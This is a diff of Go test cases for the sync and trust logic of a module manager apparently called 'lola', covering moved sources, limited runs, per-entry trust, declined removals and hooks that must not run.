+		Expect(err).To(MatchError("lola sync needs your confirmation to remove example, and there is no terminal to ask on"))
+		Expect(errs.Hints(err)).To(Equal([]string{"see them: lola sync --user -n", "then confirm them: lola sync --user -y"}))
+	})
+
+	It("a moved project replaces a cached source that no longer exists", func() {
+		old := filepath.Join(tmp, "old")
+		writeTree(filepath.Join(old, "mods", "kit"), map[string]string{"lola.yml": "name: kit\n", "commands/kit.md": "Kit\n"})
+		osc := engine.Scope{Kind: target.Project, ProjectDir: old}
+		_, err := e.Install(ctx, osc, old, []engine.InstallRequest{{Arg: "./mods/kit"}}, claude)
+		Expect(err).NotTo(HaveOccurred())
+		user := engine.Scope{Kind: target.User}
+		_, err = e.Install(ctx, user, tmp, []engine.InstallRequest{{Arg: filepath.Join(old, "mods", "kit")}}, claude)
+		Expect(err).NotTo(HaveOccurred())
+		Expect(os.RemoveAll(proj)).To(Succeed())
+		Expect(os.Rename(old, proj)).To(Succeed()) // the project moves
+		oldKit, newKit := filepath.Join(old, "mods", "kit"), filepath.Join(proj, "mods", "kit")
+		origin := func() string {
+			GinkgoHelper()
+			o, found, err := e.Store.Origin("kit")
+			Expect(err).NotTo(HaveOccurred())
+			Expect(found).To(BeTrue())
+			return o.Source
+		}
+		notice := engine.Notice{Level: engine.LevelWarn, Text: "kit: your cache has it from " + oldKit + ", which no longer exists; caching it from " + newKit}
+
+		res, err := sync(engine.SyncRequest{Options: engine.Options{DryRun: true}})
+		Expect(err).NotTo(HaveOccurred())
+		Expect(res.Notices).To(ContainElement(notice))
+		Expect(origin()).To(Equal(oldKit), "a dry run replaces nothing")
+
+		// The old location reappears while the user answers: the commit, under the cache lock,
+		// refuses it and replaces nothing.
+		_, err = sync(engine.SyncRequest{Trust: func(engine.TrustReport) (engine.TrustAnswer, error) {
+			writeTree(oldKit, map[string]string{"lola.yml": "name: kit\n"})
+			return engine.TrustAnswer{All: true}, nil
+		}})
+		Expect(err).To(MatchError(ContainSubstring(`a different module named "kit" is already in your cache`)))
+		Expect(origin()).To(Equal(oldKit))
+		Expect(os.RemoveAll(old)).To(Succeed())
+
+		res, err = sync(engine.SyncRequest{Trust: yes})
+		Expect(err).NotTo(HaveOccurred())
+		Expect(asked).To(HaveLen(1), "the content still goes through trust: a moved project has no record")
+		Expect(res.Notices).To(ContainElement(notice))
+		Expect(origin()).To(Equal(newKit), "replaced after trust")
+		Expect(read(".claude/commands/kit.md")).To(Equal("Kit\n"))
+
+		// The replaced source is not rendered into the user scope, which installed the old folder.
+		rendered, err := e.Render(ctx, user, engine.Options{})
+		Expect(err).NotTo(HaveOccurred())
+		Expect(rendered.Findings).To(ContainElement(And(HaveField("Code", engine.CodeSourceDiffers),
+			HaveField("Text", "your cache now has it from "+newKit+", not the folder it was installed from"))))
+
+		// A recorded source that still exists keeps the refusal.
+		copyKit := filepath.Join(tmp, "copy", "mods", "kit")
+		writeTree(copyKit, map[string]string{"lola.yml": "name: kit\n", "commands/kit.md": "Kit\n"})
+		manPath := filepath.Join(proj, ".lola", "project.yml")
+		Expect(os.WriteFile(manPath, []byte("version: 1\ntargets: [claude-code]\nmodules:\n  - name: kit\n    source: "+copyKit+"\n"), 0o600)).To(Succeed())
+		_, err = sync(engine.SyncRequest{Trust: yes})
+		Expect(err).To(MatchError(ContainSubstring("kit in your cache comes from " + newKit)))
+	})
+
+	It("a cached remote source is never replaced by a local folder", func() {
+		install(sc, engine.InstallRequest{Arg: url})
+		folder := filepath.Join(proj, "mods", "example")
+		writeTree(folder, map[string]string{"lola.yml": "name: example\n", "commands/example.md": "Example\n"})
+		Expect(os.MkdirAll(filepath.Join(proj, ".lola"), 0o755)).To(Succeed())
+		Expect(os.WriteFile(filepath.Join(proj, ".lola", "project.yml"), []byte("version: 1\ntargets: [claude-code]\nmodules:\n"+
+			"  - name: example\n    source: "+folder+"\n"), 0o600)).To(Succeed())
+		before := state()
+		_, err := sync(engine.SyncRequest{Trust: yes})
+		Expect(err).To(MatchError(ContainSubstring("example in your cache comes from " + url)))
+		Expect(errs.Hints(err)).To(ContainElement(ContainSubstring("lola cache rm example")))
+		Expect(state()).To(Equal(before))
+	})
+
+	It("a cached local source that cannot be examined keeps the coached refusal without echoing the system error", func() {
+		parent := filepath.Join(tmp, "par")
+		odd := filepath.Join(parent, "kit\x01")
+		// Install refuses such a path, so the cache is seeded as a hand-edited one would be.
+		Expect(os.MkdirAll(p.Staging, 0o700)).To(Succeed())
+		staged, err := os.MkdirTemp(p.Staging, "fetch-*")
+		Expect(err).NotTo(HaveOccurred())
+		writeTree(staged, map[string]string{"lola.yml": "name: kit\n", "commands/kit.md": "Kit\n"})
+		_, err = e.Store.Put(store.PutRequest{Staged: staged, FallbackName: "kit", Source: odd, Type: "folder", Now: e.Now()})
+		Expect(err).NotTo(HaveOccurred())
+		Expect(os.WriteFile(parent, []byte("a file now"), 0o600)).To(Succeed()) // lstat of the old source: ENOTDIR
+		folder := filepath.Join(proj, "mods", "kit")
+		writeTree(folder, map[string]string{"lola.yml": "name: kit\n", "commands/kit.md": "Kit\n"})
+		Expect(os.MkdirAll(filepath.Join(proj, ".lola"), 0o755)).To(Succeed())
+		Expect(os.WriteFile(filepath.Join(proj, ".lola", "project.yml"), []byte("version: 1\ntargets: [claude-code]\nmodules:\n"+
+			"  - name: kit\n    source: "+folder+"\n"), 0o600)).To(Succeed())
+		_, err = sync(engine.SyncRequest{Trust: yes})
+		Expect(err).To(MatchError(ContainSubstring("kit in your cache comes from")))
+		Expect(err.Error()).NotTo(ContainSubstring("\x01"))
+		Expect(err.Error()).NotTo(ContainSubstring("not a directory"))
+		Expect(errs.Hints(err)).To(ContainElement(ContainSubstring("lola cache rm kit")))
+	})
+
+	It("install takes the place of a cached local source that no longer exists, and of no other", func() {
+		old := filepath.Join(tmp, "old", "kit")
+		writeTree(old, map[string]string{"lola.yml": "name: kit\n", "commands/kit.md": "Kit\n"})
+		install(sc, engine.InstallRequest{Arg: old})
+		moved := filepath.Join(tmp, "moved", "kit")
+		Expect(os.MkdirAll(filepath.Dir(moved), 0o755)).To(Succeed())
+		Expect(os.Rename(old, moved)).To(Succeed())
+		install(sc, engine.InstallRequest{Arg: moved})
+		o, _, err := e.Store.Origin("kit")
+		Expect(err).NotTo(HaveOccurred())
+		Expect(o.Source).To(Equal(moved))
+
+		other := filepath.Join(tmp, "other", "kit")
+		writeTree(other, map[string]string{"lola.yml": "name: kit\n", "commands/kit.md": "Kit\n"})
+		_, err = e.Install(ctx, sc, proj, []engine.InstallRequest{{Arg: other}}, claude)
+		Expect(err).To(MatchError(ContainSubstring(`a different module named "kit" is already in your cache`)), "the moved one still exists")
+	})
+
+	Describe("limited runs", func() {
+		It("a sync limited to named modules touches nothing else", func() {
+			gone := filepath.Join(tmp, "src", "gone")
+			writeTree(gone, map[string]string{"lola.yml": "name: gone\n", "commands/gone.md": "Gone\n"})
+			install(sc, engine.InstallRequest{Arg: url, Ref: "v1"}, engine.InstallRequest{Arg: src}, engine.InstallRequest{Arg: gone})
+			push(map[string]string{"commands/ship.md": "Ship v2\n"})
+			bumped := pinFor("main")
+			// A pull re-pins example to main and stops listing gone: both untrusted, neither named.
+			pull(manifest.Change{Set: []manifest.Entry{bumped}, Remove: []string{"gone"}})
+			requests.Store(0)
+			before := state()
+
+			_, err := sync(engine.SyncRequest{Modules: []string{"nope"}, Trust: yes, ConfirmRemovals: confirm})
+			Expect(err).To(MatchError("nope is neither in project.yml nor installed here"))
+			Expect(errs.Hints(err)).To(Equal([]string{"modules in project.yml: example, other", "installed but no longer listed: gone"}))
+			Expect(state()).To(Equal(before), "an unknown name is refused before anything else")
+
+			res, err := sync(engine.SyncRequest{Modules: []string{"other"}, ConfirmRemovals: confirm})
+			Expect(err).NotTo(HaveOccurred(), "the untrusted entries the user did not name need no answer")
+			Expect(res.InSync).To(BeTrue())
+			Expect(res.Notices).To(ContainElement(engine.Notice{Level: engine.LevelWarn, Text: "2 other modules are not in sync: example, gone → lola sync"}))
+			Expect(asked).To(BeEmpty())
+			Expect(removals).To(BeEmpty())
+			Expect(requests.Load()).To(BeZero(), "example is not fetched")
+			Expect(read(".claude/commands/gone.md")).To(Equal("Gone\n"), "an unnamed removed module stays installed")
+			Expect(read(".claude/commands/ship.md")).To(Equal("Ship $ARGUMENTS\n"))
+			Expect(lockFile().Modules).To(HaveKey("gone"))
+			Expect(state()).To(Equal(before))
+
+			res, err = sync(engine.SyncRequest{Modules: []string{"gone"}, Trust: yes, ConfirmRemovals: confirm})
+			Expect(err).NotTo(HaveOccurred())
+			Expect(asked).To(HaveExactElements(HaveField("Changes", HaveExactElements(And(HaveField("Module", "gone"), HaveField("Kind", "removed"))))),
+				"only the named module's change is asked about")
+			Expect(removals).To(HaveExactElements(HaveExactElements(And(HaveField("Module", "gone"), HaveField("WholeModule", true)))))
+			Expect(res.Removals).To(HaveLen(1))
+			Expect(filepath.Join(proj, ".claude/commands/gone.md")).NotTo(BeAnExistingFile())
+			Expect(lockFile().Modules).NotTo(HaveKey("gone"))
+			Expect(requests.Load()).To(BeZero())
+			r, err := e.Trust.Load(proj)
+			Expect(err).NotTo(HaveOccurred())
+			Expect(r.View.Find("gone")).To(BeNil(), "the trusted removal is recorded")
+			Expect(r.View.Covers(bumped)).To(BeFalse(), "the unnamed entry stays untrusted")
+			Expect(r.View.Find("example").Digest).To(Equal(lockFile().Modules["example"].Digest))
+
+			asked = nil
+			res, err = sync(engine.SyncRequest{Modules: []string{"example"}, Trust: yes})
+			Expect(err).NotTo(HaveOccurred())
+			Expect(asked).To(HaveLen(1))
+			Expect(res.Notices).NotTo(ContainElement(HaveField("Text", ContainSubstring("not in sync"))), "every module is in sync now")
+			Expect(read(".claude/commands/ship.md")).To(Equal("Ship v2\n"))
+			Expect(covered()).To(BeTrue())
+		})
+
+		It("re-pins only the named entries with --update", func() {
+			install(sc, engine.InstallRequest{Arg: url, Ref: "main"}, engine.InstallRequest{Arg: src})
+			before := loadManifest()
+			commit := push(map[string]string{"commands/ship.md": "Ship v2\n"})
+			_, err := sync(engine.SyncRequest{Modules: []string{"other"}, Update: true, Trust: yes})
+			Expect(err).NotTo(HaveOccurred())
+			Expect(loadManifest()).To(Equal(before), "a folder is never pinned, and example was not named")
+			_, err = sync(engine.SyncRequest{Modules: []string{"example"}, Update: true, Trust: yes})
+			Expect(err).NotTo(HaveOccurred())
+			Expect(loadManifest().Find("example").Commit).To(Equal(commit))
 		})
 	})
 
@@ -846,8 +1304,8 @@ var _ = Describe("Sync", func() {
 			drop()
 			before := state()
 			_, err := sync(engine.SyncRequest{})
-			Expect(err).To(MatchError("lola sync would remove modules, and there is no terminal to ask on"))
-			Expect(errs.Hints(err)).To(Equal([]string{"see them: lola sync -n", "then: lola sync -y"}))
+			Expect(err).To(MatchError("lola sync needs your confirmation to remove example, other, and there is no terminal to ask on"))
+			Expect(errs.Hints(err)).To(Equal([]string{"see them: lola sync -n", "then confirm them: lola sync -y"}))
 			Expect(state()).To(Equal(before))
 			res, err := sync(engine.SyncRequest{Options: engine.Options{DryRun: true}})
 			Expect(err).NotTo(HaveOccurred())
@@ -861,7 +1319,11 @@ var _ = Describe("Sync", func() {
 			lp := filepath.Join(proj, ".lola", "lock.json")
 			l, err := ledger.Load(lp)
 			Expect(err).NotTo(HaveOccurred())
-			l.Modules["other"].Artifacts = append(l.Modules["other"].Artifacts, a)
+			o := l.Modules["other"]
+			o.Artifacts = append(o.Artifacts, a)
+			if !slices.Contains(o.Targets, a.Target) {
+				o.Targets = append(o.Targets, a.Target) // lock.json lists the target of every artifact
+			}
 			Expect(l.Save(lp)).To(Succeed())
 		}
 		DescribeTable("refuses a planted ledger removal before asking about it",
@@ -889,7 +1351,7 @@ var _ = Describe("Sync", func() {
 				GinkgoHelper()
 				out := map[string]string{}
 				for k, v := range state() {
-					if !strings.HasPrefix(k, filepath.Dir(p.Store)) {
+					if !strings.HasPrefix(k, filepath.Dir(p.Store)) && k != p.Trust {
 						out[k] = v
 					}
 				}
@@ -916,7 +1378,310 @@ var _ = Describe("Sync", func() {
 			Expect(removals).To(HaveLen(1))
 			Expect(consents).To(BeEmpty(), "no hook consent was asked before the removals")
 			Expect(p.Consent).NotTo(BeAnExistingFile(), "none was recorded")
-			Expect(project()).To(Equal(before), "nothing in the project or the trust record changed")
+			Expect(project()).To(Equal(before), "nothing in the project changed")
+			Expect(covered()).To(BeTrue(), "the trust answer is recorded, so the next sync asks only the removals")
+		})
+	})
+
+	Describe("per-entry trust", func() {
+		// only answers the trust question by accepting the named entries, recording each report.
+		only := func(names ...string) func(engine.TrustReport) (engine.TrustAnswer, error) {
+			return func(rep engine.TrustReport) (engine.TrustAnswer, error) {
+				asked = append(asked, rep)
+				return engine.TrustAnswer{Modules: names}, nil
+			}
+		}
+		folder := func(name string, files map[string]string) string {
+			dir := filepath.Join(proj, "mods", name)
+			writeTree(dir, files)
+			writeTree(dir, map[string]string{"lola.yml": "name: " + name + "\n", "commands/" + name + ".md": name + "\n"})
+			return dir
+		}
+		// tool serves a second repository, holding module tool, next to example.
+		tool := func() string {
+			GinkgoHelper()
+			w, b := filepath.Join(tmp, "toolwork"), filepath.Join(tmp, "srv", "tool.git")
+			writeTree(w, map[string]string{"lola.yml": "name: tool\n", "commands/tool.md": "Tool\n"})
+			gitIn(w, "init", "-q", "-b", "main")
+			gitIn(w, "add", "-A")
+			gitIn(w, "commit", "-q", "-m", "init")
+			gitIn(tmp, "clone", "-q", "--bare", w, b)
+			return strings.TrimSuffix(url, "/example.git") + "/tool.git"
+		}
+		changed := func(rep engine.TrustReport) []string {
+			var out []string
+			for _, c := range rep.Changes {
+				out = append(out, c.Module)
+			}
+			return out
+		}
+
+		It("a declined entry stays as installed and is asked again", func() {
+			gone := folder("gone", nil)
+			install(sc, engine.InstallRequest{Arg: url, Ref: "v1"}, engine.InstallRequest{Arg: gone})
+			push(map[string]string{"commands/ship.md": "Ship v2\n"})
+			folder("kit", nil)
+			folder("acc", nil)
+			pull(manifest.Change{Set: []manifest.Entry{{Name: "example", Source: url, Ref: "main"}, {Name: "kit", Source: "mods/kit"},
+				{Name: "acc", Source: "mods/acc"}}, Remove: []string{"gone"}})
+
+			res, err := sync(engine.SyncRequest{Trust: only("acc"), ConfirmRemovals: confirm})
+			Expect(err).NotTo(HaveOccurred())
+			Expect(changed(asked[0])).To(ConsistOf("acc", "example", "gone", "kit"))
+			Expect(removals).To(BeEmpty(), "the declined removal is not asked about")
+			Expect(read(".claude/commands/acc.md")).To(Equal("acc\n"), "the accepted entry is installed")
+			Expect(read(".claude/commands/ship.md")).To(Equal("Ship $ARGUMENTS\n"), "a declined change stays at the version installed")
+			Expect(filepath.Join(proj, ".claude/commands/kit.md")).NotTo(BeAnExistingFile(), "a declined addition stays uninstalled")
+			Expect(read(".claude/commands/gone.md")).To(Equal("gone\n"), "a declined removal stays installed")
+			Expect(lockFile().Modules).To(HaveKey("gone"))
+			Expect(res.Notices).To(ContainElement(engine.Notice{Level: engine.LevelWarn,
+				Text: "left as installed until you trust them: example, gone, kit → lola sync"}))
+			Expect(res.Trust.Changes).To(HaveExactElements(HaveField("Module", "acc")), "the result reports what was applied")
+			Expect(res.Modules).To(HaveExactElements(HaveField("Name", "acc")))
+
+			asked = nil
+			_, err = sync(engine.SyncRequest{Trust: only("acc"), ConfirmRemovals: confirm})
+			Expect(err).To(MatchError(engine.ErrDeclined), "acc is no longer a change, so this answer accepts nothing")
+			Expect(changed(asked[0])).To(ConsistOf("example", "gone", "kit"), "each declined entry is asked about again")
+		})
+
+		It("partial trust records and caches only what was accepted", func() {
+			gone := folder("gone", nil)
+			install(sc, engine.InstallRequest{Arg: url, Ref: "v1"}, engine.InstallRequest{Arg: gone})
+			before, err := e.Trust.Load(proj)
+			Expect(err).NotTo(HaveOccurred())
+			push(map[string]string{"commands/ship.md": "Ship v2\n"})
+			toolURL := tool()
+			folder("kit", nil)
+			pull(manifest.Change{Set: []manifest.Entry{{Name: "example", Source: url, Ref: "main"}, {Name: "tool", Source: toolURL, Ref: "main"},
+				{Name: "kit", Source: "mods/kit"}}, Remove: []string{"gone"}})
+			pulled := loadManifest()
+
+			res, err := sync(engine.SyncRequest{Trust: only("tool", "kit"), ConfirmRemovals: confirm})
+			Expect(err).NotTo(HaveOccurred())
+			Expect(res.Pins).To(HaveExactElements(HaveField("Module", "tool")), "pins are written for accepted entries only")
+			Expect(loadManifest().Find("example")).To(Equal(pulled.Find("example")), "the declined entry gets no pin")
+			Expect(loadManifest().Find("tool").Digest).NotTo(BeEmpty())
+			r, err := e.Trust.Load(proj)
+			Expect(err).NotTo(HaveOccurred())
+			Expect(r.View.Find("example")).To(Equal(before.View.Find("example")), "a declined entry keeps its old record")
+			Expect(r.View.Find("gone")).To(Equal(before.View.Find("gone")), "a declined removal stays in the record")
+			Expect(r.View.Covers(*loadManifest().Find("tool"))).To(BeTrue(), "the accepted entry is recorded with its pin")
+			Expect(r.View.Covers(*loadManifest().Find("kit"))).To(BeTrue())
+			o, found, err := e.Store.Origin("example")
+			Expect(err).NotTo(HaveOccurred())
+			Expect(found).To(BeTrue())
+			Expect(o.Heads).To(HaveExactElements(HaveField("Ref", "v1")), "the declined fetch of main is never cached")
+			versions, err := os.ReadDir(filepath.Join(p.Store, "example", "versions"))
+			Expect(err).NotTo(HaveOccurred())
+			Expect(versions).To(HaveLen(1))
+			Expect(e.Store.Has("tool")).To(BeTrue(), "the accepted content is cached")
+		})
+
+		It("a run limited to names trusts the top-level targets only through a named entry that installs to them", func() {
+			own, docs, kit := folder("own", nil), folder("docs", nil), folder("kit", nil)
+			install(sc, engine.InstallRequest{Arg: docs}, engine.InstallRequest{Arg: kit})
+			_, err := e.Install(ctx, sc, proj, []engine.InstallRequest{{Arg: own}}, engine.Options{Targets: []string{"opencode"}})
+			Expect(err).NotTo(HaveOccurred())
+			off := false
+			ownEntry, docsEntry := *loadManifest().Find("own"), *loadManifest().Find("docs")
+			ownEntry.Rules, docsEntry.Rules = &off, &off
+			pull(manifest.Change{Targets: []string{"claude-code", "opencode"}, Set: []manifest.Entry{ownEntry, docsEntry}})
+			topLevel := func() []string {
+				GinkgoHelper()
+				r, err := e.Trust.Load(proj)
+				Expect(err).NotTo(HaveOccurred())
+				return r.View.Targets
+			}
+
+			// own has targets of its own: trusting all of a run limited to it leaves them untrusted.
+			_, err = sync(engine.SyncRequest{Modules: []string{"own"}, Trust: yes})
+			Expect(err).NotTo(HaveOccurred())
+			Expect(asked).To(HaveLen(1))
+			Expect(asked[0].Targets).To(BeNil(), "the run installs nothing to them, so it does not ask about them")
+			Expect(changed(asked[0])).To(Equal([]string{"own"}))
+			Expect(topLevel()).To(Equal([]string{"claude-code"}))
+			Expect(filepath.Join(proj, ".opencode/commands/docs.md")).NotTo(BeAnExistingFile())
+			Expect(filepath.Join(proj, ".opencode/commands/kit.md")).NotTo(BeAnExistingFile())
+
+			// docs has none: trusting it trusts them, for it and, without a question, for kit.
+			asked = nil
+			_, err = sync(engine.SyncRequest{Modules: []string{"docs"}, Trust: yes})
+			Expect(err).NotTo(HaveOccurred())
+			Expect(asked).To(HaveLen(1))
+			Expect(asked[0].Targets).NotTo(BeNil())
+			Expect(topLevel()).To(Equal([]string{"claude-code", "opencode"}))
+			Expect(read(".opencode/commands/docs.md")).To(Equal("docs\n"))
+			Expect(filepath.Join(proj, ".opencode/commands/kit.md")).NotTo(BeAnExistingFile(), "kit was not in the run")
+
+			asked = nil
+			_, err = sync(engine.SyncRequest{Modules: []string{"kit"}})
+			Expect(err).NotTo(HaveOccurred(), "off a terminal: nothing left to trust")
+			Expect(asked).To(BeEmpty())
+			Expect(read(".opencode/commands/kit.md")).To(Equal("kit\n"))
+		})
+
+		It("top-level targets are trusted only with an entry that installs to them", func() {
+			kit := folder("kit", nil)
+			gone := folder("gone", nil)
+			own := folder("own", nil)
+			install(sc, engine.InstallRequest{Arg: kit}, engine.InstallRequest{Arg: gone})
+			_, err := e.Install(ctx, sc, proj, []engine.InstallRequest{{Arg: own}}, engine.Options{Targets: []string{"opencode"}})
+			Expect(err).NotTo(HaveOccurred())
+			Expect(loadManifest().Find("own").Targets).To(Equal([]string{"opencode"}))
+			pull(manifest.Change{Targets: []string{"claude-code", "opencode"}, Remove: []string{"gone"}})
+			Expect(os.Remove(filepath.Join(proj, ".opencode/commands/own.md"))).To(Succeed())
+
+			// A ticked removed entry does not accept them: kit, which installs to them, leaves the run.
+			res, err := sync(engine.SyncRequest{Trust: only("gone"), ConfirmRemovals: confirm})
+			Expect(err).NotTo(HaveOccurred())
+			Expect(asked[0].Targets).NotTo(BeNil())
+			Expect(filepath.Join(proj, ".claude/commands/gone.md")).NotTo(BeAnExistingFile(), "the accepted removal is applied")
+			Expect(filepath.Join(proj, ".opencode/commands/kit.md")).NotTo(BeAnExistingFile(), "kit does not take the untrusted targets")
+			Expect(read(".opencode/commands/own.md")).To(Equal("own\n"), "an entry with targets of its own stays in the run")
+			Expect(res.Notices).To(ContainElement(HaveField("Text", "left as installed until you trust them: kit → lola sync")))
+			r, err := e.Trust.Load(proj)
+			Expect(err).NotTo(HaveOccurred())
+			Expect(r.View.Targets).To(Equal([]string{"claude-code"}))
+
+			// An accepted entry that installs to them accepts them, and kit joins the run.
+			folder("fresh", nil)
+			pull(manifest.Change{Set: []manifest.Entry{{Name: "fresh", Source: "mods/fresh"}}})
+			asked = nil
+			_, err = sync(engine.SyncRequest{Trust: only("fresh"), ConfirmRemovals: confirm})
+			Expect(err).NotTo(HaveOccurred())
+			Expect(read(".opencode/commands/kit.md")).To(Equal("kit\n"))
+			Expect(read(".opencode/commands/fresh.md")).To(Equal("fresh\n"))
+			Expect(covered()).To(BeTrue())
+
+			// Covered top-level targets drop no entry from a partial answer.
+			off := false
+			ownEntry := *loadManifest().Find("own")
+			ownEntry.Rules = &off
+			folder("late", nil)
+			pull(manifest.Change{Set: []manifest.Entry{ownEntry, {Name: "late", Source: "mods/late"}}})
+			Expect(os.Remove(filepath.Join(proj, ".claude/commands/kit.md"))).To(Succeed())
+			_, err = sync(engine.SyncRequest{Trust: only("late"), ConfirmRemovals: confirm})
+			Expect(err).NotTo(HaveOccurred())
+			Expect(read(".claude/commands/kit.md")).To(Equal("kit\n"), "kit stayed in the run")
+		})
+
+		It("a No to removals applies nothing and keeps the trust answer", func() {
+			gone := folder("gone", nil)
+			install(sc, engine.InstallRequest{Arg: url, Ref: "v1"}, engine.InstallRequest{Arg: folder("other", nil)}, engine.InstallRequest{Arg: gone})
+			push(map[string]string{"commands/ship.md": "Ship v2\n"})
+			off := false
+			other := *loadManifest().Find("other")
+			other.Rules = &off
+			pull(manifest.Change{Set: []manifest.Entry{{Name: "example", Source: url, Ref: "v1"}, other}, Remove: []string{"gone"}})
+			project := func() map[string]string {
+				out := state()
+				maps.DeleteFunc(out, func(k, _ string) bool { return strings.HasPrefix(k, filepath.Dir(p.Store)) || k == p.Trust })
+				return out
+			}
+			before := project()
+			no := func(rs []engine.Removal) (bool, error) { removals = append(removals, rs); return false, nil }
+
+			_, err := sync(engine.SyncRequest{Trust: yes, ConfirmRemovals: no})
+			Expect(err).To(MatchError(engine.ErrDeclined))
+			declined, ok := errors.AsType[*engine.RemovalsDeclinedError](err)
+			Expect(ok).To(BeTrue())
+			Expect(*declined).To(Equal(engine.RemovalsDeclinedError{Recorded: true, Render: true, Again: []string{"example"}}),
+				"render would install other without rules; example's pin is asked again")
+			Expect(project()).To(Equal(before), "nothing applied")
+			r, err := e.Trust.Load(proj)
+			Expect(err).NotTo(HaveOccurred())
+			Expect(r.View.Covers(*loadManifest().Find("example"))).To(BeTrue(), "the accepted unpinned entry, without the pin lola did not write")
+			Expect(r.View.Covers(other)).To(BeTrue())
+			Expect(r.View.Find("gone")).To(BeNil())
+
+			asked, removals = nil, nil
+			_, err = sync(engine.SyncRequest{Trust: yes, ConfirmRemovals: no})
+			Expect(err).To(MatchError(engine.ErrDeclined))
+			Expect(asked).To(HaveExactElements(HaveField("Changes", HaveExactElements(And(HaveField("Module", "example"),
+				HaveField("Reason", "pin what v1 serves now"))))), "only the pin is asked again")
+			Expect(removals).To(HaveLen(1), "and the removals")
+		})
+
+		It("a No to removals does not claim render installs a folder whose content changed", func() {
+			notes := folder("notes", nil)
+			gone := folder("gone", nil)
+			install(sc, engine.InstallRequest{Arg: notes}, engine.InstallRequest{Arg: gone})
+			writeTree(notes, map[string]string{"commands/notes.md": "edited\n"})
+			off := false
+			entry := *loadManifest().Find("notes")
+			entry.Rules = &off
+			pull(manifest.Change{Set: []manifest.Entry{entry}, Remove: []string{"gone"}})
+			no := func(rs []engine.Removal) (bool, error) { return false, nil }
+
+			_, err := sync(engine.SyncRequest{Trust: yes, ConfirmRemovals: no})
+			declined, ok := errors.AsType[*engine.RemovalsDeclinedError](err)
+			Expect(ok).To(BeTrue())
+			Expect(*declined).To(Equal(engine.RemovalsDeclinedError{Recorded: true, Again: []string{"notes"}}),
+				"render still leaves notes out: its content changed, so the next sync asks about it again")
+		})
+
+		It("says a covered folder lola never installed is not installed yet, as an addition", func() {
+			gone := folder("gone", nil)
+			install(sc, engine.InstallRequest{Arg: gone})
+			folder("fresh", nil)
+			pull(manifest.Change{Set: []manifest.Entry{{Name: "fresh", Source: "mods/fresh"}}, Remove: []string{"gone"}})
+			no := func(rs []engine.Removal) (bool, error) { return false, nil }
+			_, err := sync(engine.SyncRequest{Trust: yes, ConfirmRemovals: no})
+			_, ok := errors.AsType[*engine.RemovalsDeclinedError](err)
+			Expect(ok).To(BeTrue())
+			Expect(lockFile().Modules).NotTo(HaveKey("fresh"), "the removals No installed nothing")
+			Expect(covered()).To(BeTrue())
+
+			_, err = sync(engine.SyncRequest{Modules: []string{"fresh"}})
+			refusal, isRefusal := errors.AsType[*engine.TrustRefusalError](err)
+			Expect(isRefusal).To(BeTrue(), "%v", err)
+			Expect(refusal.Report.Changes).To(HaveExactElements(And(HaveField("Module", "fresh"), HaveField("Kind", "added"),
+				HaveField("Reason", "not installed yet"))))
+		})
+
+		It("a No to removals does not claim render installs a changed folder the run left out", func() {
+			a, notes, gone := folder("a", nil), folder("notes", nil), folder("gone", nil)
+			install(sc, engine.InstallRequest{Arg: a}, engine.InstallRequest{Arg: notes}, engine.InstallRequest{Arg: gone})
+			writeTree(a, map[string]string{"commands/a.md": "edited\n"})
+			writeTree(notes, map[string]string{"commands/notes.md": "edited\n"})
+			pull(manifest.Change{Targets: []string{"claude-code", "opencode"}, Remove: []string{"gone"}})
+			no := func(rs []engine.Removal) (bool, error) { return false, nil }
+
+			_, err := sync(engine.SyncRequest{Trust: only("a", "gone"), ConfirmRemovals: no})
+			declined, ok := errors.AsType[*engine.RemovalsDeclinedError](err)
+			Expect(ok).To(BeTrue())
+			Expect(*declined).To(Equal(engine.RemovalsDeclinedError{Recorded: true, Again: []string{"a"}}),
+				"render leaves a and notes out: their content changed; the next sync asks about the accepted a again")
+		})
+
+		It("a declined entry's hooks are neither asked about, recorded nor run", func() {
+			marker := filepath.Join(tmp, "ran")
+			folder("hooked", map[string]string{
+				"lola.yml":               "name: hooked\nhooks: {post-install: hooks/post.sh}\n",
+				"hooks/post.sh":          "#!/bin/sh\ntouch " + marker + "\n",
+				"skills/review/SKILL.md": "---\ndescription: Review\nhooks: {Stop: [{hooks: [{type: command, command: ./stop.sh}]}]}\n---\nR.\n"})
+			Expect(os.Chmod(filepath.Join(proj, "mods", "hooked", "hooks", "post.sh"), 0o755)).To(Succeed())
+			folder("plain", nil)
+			install(sc, engine.InstallRequest{Arg: src})
+			pull(manifest.Change{Set: []manifest.Entry{{Name: "hooked", Source: "mods/hooked"}, {Name: "plain", Source: "mods/plain"}}})
+			opts := engine.Options{
+				Ask: func(m string, _ []engine.HookScript) (bool, error) {
+					Fail("asked install hook consent for " + m)
+					return false, nil
+				},
+				AskRuntimeHooks: func(m string, _ []engine.RuntimeHook) (bool, error) {
+					Fail("offered runtime hooks of " + m)
+					return false, nil
+				},
+			}
+			_, err := sync(engine.SyncRequest{Trust: only("plain"), ConfirmRemovals: confirm, Options: opts})
+			Expect(err).NotTo(HaveOccurred())
+			Expect(asked[0].Changes).To(ContainElement(And(HaveField("Module", "hooked"), HaveField("Hooks", Not(BeEmpty())))),
+				"the diff showed its hooks")
+			Expect(marker).NotTo(BeAnExistingFile(), "its hook never ran")
+			Expect(p.Consent).NotTo(BeAnExistingFile(), "no consent recorded for it")
+			Expect(read(".claude/commands/plain.md")).To(Equal("plain\n"))
 		})
 	})
 
@@ -943,7 +1708,8 @@ var _ = Describe("Sync", func() {
 			before := state()
 
 			_, err := sync(engine.SyncRequest{ConfirmRemovals: confirm})
-			Expect(err).To(MatchError(ContainSubstring("changed since you last trusted it")))
+			Expect(err).To(MatchError("lola sync needs your trust for .lola/project.yml, which has not been trusted on this machine, " +
+				"and there is no terminal to ask on"))
 			Expect(state()).To(Equal(before))
 
 			res, err := sync(engine.SyncRequest{Options: engine.Options{DryRun: true}})
@@ -965,7 +1731,7 @@ var _ = Describe("Sync", func() {
 			writeTree(filepath.Join(proj, "mods", "kit"), map[string]string{"lola.yml": "name: kit\n", "commands/fix.md": "Fix.\n"})
 			pull(manifest.Change{Set: []manifest.Entry{{Name: "kit", Source: "mods/kit"}}, Remove: []string{"other"}})
 			before := state()
-			res, err := sync(engine.SyncRequest{UpdateAll: true, Options: engine.Options{DryRun: true}})
+			res, err := sync(engine.SyncRequest{Update: true, Options: engine.Options{DryRun: true}})
 			Expect(err).NotTo(HaveOccurred())
 			Expect(res.DryRun).To(BeTrue())
 			Expect(res.Pins).To(ContainElement(And(HaveField("Module", "example"), HaveField("Reason", engine.PinUpdate), HaveField("Written", false))))
